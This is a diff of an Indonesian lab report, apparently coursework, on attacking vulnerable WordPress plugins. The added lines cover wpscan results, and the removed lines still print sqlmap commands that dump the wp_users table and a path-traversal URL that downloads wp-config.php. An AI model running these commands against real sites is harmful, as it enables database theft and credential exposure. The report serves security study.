@@ -66,48 +66,33 @@ kemudian akan ditemukan sebuah username yang digunakan untuk login pada website 
 ![serang2](asset/tugas2-023/15.PNG)
 catatan : alamat website adalah alamat website berbeda (dengan IP address 192.168.232.129)
 
-####Uji Coba Menggunakan League Manager 3.9.1.1
-Pada tahap ini dilakukan instalasi plugin league manager versi 3.9.1.1. berikut ini adalah tampilan plugin league manager 3.9.1.1 ketika sudah diaktifkan :
+####Uji Coba Menggunakan League Manager 3.9.1.11
+Pada tahap ini dilakukan instalasi plugin league manager versi 3.9.1.11. berikut ini adalah tampilan plugin league manager 3.9.1.11 ketika sudah diaktifkan :
 
 ![league manager 3.9.1.1](asset/tugas2-023/14.PNG)
+
+uji coba menggunakan wpscan didapati hasil sebagai berikut
+
+![serangleague](asset/tugas2-023/leaguemanager_wpscan.PNG)
 
 Pada uji coba ini dihasilkan hasil yang sama seperti ketika menggunakan plugin video player 1.5.16
 
 ![league](asset/tugas2-023/16.PNG)
 
+####Uji Coba Menggunakan WP Ultimate Explorer 1.1
+Pada tahap ini dilakukan instalasi plugin WP Ultimate Explorer versi 1.1. berikut ini adalah tampilan plugin WP Ultimate Explorer versi 1.1 ketika sudah diaktifkan :
+
+![wpultiexplore](asset/tugas2-023/wp-ultimate-explorer-show.png)
+
+uji coba menggunakan wpscan didapati hasil sebagai berikut
+
+![wpexploreratt](asset/tugas2-023/wp-ultimate-explorer.PNG)
+
+####Uji Coba Menggunakan WP Symposium 15.1
+
+uji coba menggunakan wpscan didapati hasil sebagai berikut
+
+![wpwp](asset/tugas2-023/wp-symposium.PNG)
+
 ####Uji Coba Serangan SQL Injection
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Untuk melakukan uji coba serangan SQL Injection, maka kita memerlukan tools yang bernama [sqlmap](http://sqlmap.org). Kali ini kita akan mencoba melakukan serangan pada plugin League Manager dengan celah keamanan seperti pada website [ini](https://www.exploit-db.com/exploits/37182/). 
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Untuk melakukannya kita akan menyerang link dari pertandingan yang ada pada website tersebut. Perintah yang  digunakan untuk mendapatkan database yang digunakan adalah:
-```
-sqlmap --url "http://target.com/?match=1" --level 5 --risk 3 -dbs
-```
-```
-# sqlmap --url "http://10.151.36.38/wordpress/index.php/2016/10/12/tet?match=1" --level 5 --risk 3 -dbs
-```
 
-Maka akan dihasilkan :
-![getDB](asset/tugas2/getDB.png)
-
-Selanjutnya kita akan mencari tabel yang ada dalam database tersebut. Perintah yang digunakan adalah sebagai berikut ini:
-```
-# sqlmap --url "http://10.151.36.38/wordpress/index.php/2016/10/12/tet?match=1" --level 5 --risk 3 --tables -D wordpress
-```
-Akan muncul semua tabel yang ada. Disini kita menumukan table wp_user, untuk itu kita akan melihat data apa saja yang ada dalam tabel tersebut. Perintah yang digunakan adalah:
-```
-# sqlmap --url "http://10.151.36.38/wordpress/index.php/2016/10/12/tet?match=1" --level 5 --risk 3 --dump -D wordpress -T wp_users
-```
-
-Tara, kita mendapatkan hasil username dan password dari login wordpress yang terdaftar.
-
-![getUser](asset/tugas2/getUser.png)
-
->Note: hasil password didapat karena hash sudah ada dalam dictionary
-
-####Uji Serangan pada Plugin HB Audio Gallery Lite 1.0.0
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Pada plugin tersebut terdapat sebuah celah keamanan berupa Arbitrary File Donwload. Jadi celah keamanan ini dapat mendownload file yang seharusnya tidak boleh diakses oleh pengguna. Dokumentasi dari celah ini dapat dibaca [disini](https://www.exploit-db.com/exploits/39589/). Cara memanfaatkan celah ini adalah dengan menggunakan  perintah:
-```
-/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10
-```
-
-Setelah menjalankan perintah tersebut maka file wp-config.php akan didownload.
-![getWp-config](asset/tugas2/getWp-config.png)
